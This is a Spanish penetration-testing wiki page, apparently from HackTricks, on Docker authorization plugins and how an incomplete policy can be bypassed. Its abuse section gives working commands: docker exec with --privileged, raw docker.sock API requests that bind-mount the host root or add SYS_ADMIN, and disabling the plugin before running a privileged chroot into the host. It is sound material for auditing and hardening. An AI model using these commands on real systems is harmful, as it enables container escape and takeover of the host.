# Complementos de autorización en tiempo de ejecución

{{#include ../../../banners/hacktricks-training.md}}

## Visión general

Los complementos de autorización en tiempo de ejecución son una capa adicional de política que decide si un solicitante puede realizar una acción determinada en el daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el Docker daemon tiene, de facto, un amplio control sobre él. Los complementos de autorización intentan restringir ese modelo examinando la identidad del usuario autenticado y la operación API solicitada, y permitiendo o denegando la petición según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una API de Docker o a un usuario en el grupo `docker`. En esos entornos, la cuestión ya no es solo “¿puedo alcanzar el daemon?”, sino también “¿está el daemon protegido por una capa de autorización y, de ser así, puede esa capa ser eludida mediante endpoints no manejados, un análisis JSON débil o permisos en la gestión de plugins?”

## Funcionamiento

Cuando una solicitud llega al Docker daemon, el subsistema de autorización puede pasar el contexto de la petición a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, cabeceras seleccionadas y partes del body de la solicitud o respuesta cuando el tipo de contenido lo permite. Varios plugins pueden encadenarse, y el acceso solo se concede si todos los plugins permiten la solicitud.

Este modelo parece robusto, pero su seguridad depende totalmente de lo bien que el autor de la política haya entendido la API. Un plugin que bloquea `docker run --privileged` pero ignora `docker exec`, pasa por alto claves JSON alternativas como `Binds` a nivel superior, o permite la administración de plugins puede crear una falsa sensación de restricción mientras deja abiertas vías directas de escalada de privilegios.

## Objetivos comunes de los plugins

Las áreas importantes para la revisión de la política son:

- endpoints de creación de contenedores
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y opciones de compartición de namespaces
- comportamiento de `docker exec`
- endpoints de gestión de plugins
- cualquier endpoint que pueda desencadenar indirectamente acciones en tiempo de ejecución fuera del modelo de política previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaron el estudio de este modelo porque sus archivos de política y rutas de código mostraban cómo se implementaba realmente el mapeo de endpoint a acción. Para labores de evaluación, la lección importante es que el autor de la política debe entender toda la superficie de la API en lugar de solo los comandos CLI más visibles.

## Abuso

El primer objetivo es averiguar qué es lo que realmente está bloqueado. Si el daemon deniega una acción, el error a menudo leaks el nombre del plugin, lo que ayuda a identificar el control en uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea repetitiva de comprobar qué rutas de la API y qué estructuras JSON están realmente permitidas por el plugin.

Si el entorno usa un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos están realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones importan porque muchas fallas de autorización son específicas de campo en lugar de concepto. Un plugin puede rechazar un patrón de CLI sin bloquear completamente la estructura equivalente de la API.

### Ejemplo completo: `docker exec` añade privilegios después de la creación del contenedor

Una política que bloquee la creación de contenedores privilegiados pero permita la creación de contenedores sin confinamiento y el uso de `docker exec` aún puede ser eludida:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
If the daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo privilegiado dentro de un container que el autor de la política creía que estaba restringido.

### Ejemplo completo: Bind Mount Through Raw API

Algunas políticas rotas inspeccionan solo una estructura JSON. Si el bind mount del sistema de archivos raíz no se bloquea de manera consistente, el host todavía puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer bajo `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo al sistema de archivos del host. El detalle interesante es que el bypass proviene de una cobertura de políticas incompleta en lugar de un bug del kernel.

### Ejemplo completo: Atributo de capability sin verificar

Si la política olvida filtrar un atributo relacionado con capability, el atacante puede crear un contenedor que recupere una capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` o una capacidad igualmente potente esté presente, muchas técnicas de escape descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) se vuelven alcanzables.

### Ejemplo completo: Disabling The Plugin

Si se permiten plugin-management operations, el bypass más limpio podría ser desactivar el control por completo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Esto es una falla de política a nivel del plano de control. La capa de autorización existe, pero el usuario al que se suponía que se debía restringir aún conserva el permiso para desactivarla.

## Comprobaciones

Estos comandos están destinados a identificar si existe una capa de políticas y si parece ser completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Qué es interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman una capa de autorización y con frecuencia revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para saber si es posible deshabilitarlos o reconfigurarlos.
- Una política que bloquea solo las acciones obvias de la CLI pero no las solicitudes API directas debe considerarse eludible hasta que se demuestre lo contrario.

## Valores predeterminados del runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | El acceso al daemon es efectivamente todo o nada a menos que se configure un plugin de autorización | política de plugins incompleta, listas negras en lugar de listas blancas, permitir la gestión de plugins, puntos ciegos a nivel de campo |
| Podman | Not a common direct equivalent | Podman suele basarse más en permisos Unix, ejecución rootless y decisiones sobre la exposición de la API que en plugins authz al estilo Docker | exponer ampliamente una API de Podman con root, permisos débiles en el socket |
| containerd / CRI-O | Different control model | Estos runtimes suelen depender de permisos del socket, límites de confianza del nodo y controles del orquestador en capas superiores en lugar de plugins authz de Docker | montar el socket en los workloads, asunciones de confianza débiles a nivel local del nodo |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | RBAC del clúster y controles de admisión son la capa principal de políticas | RBAC demasiado amplio, política de admisión débil, exponer kubelet o runtime APIs directamente |
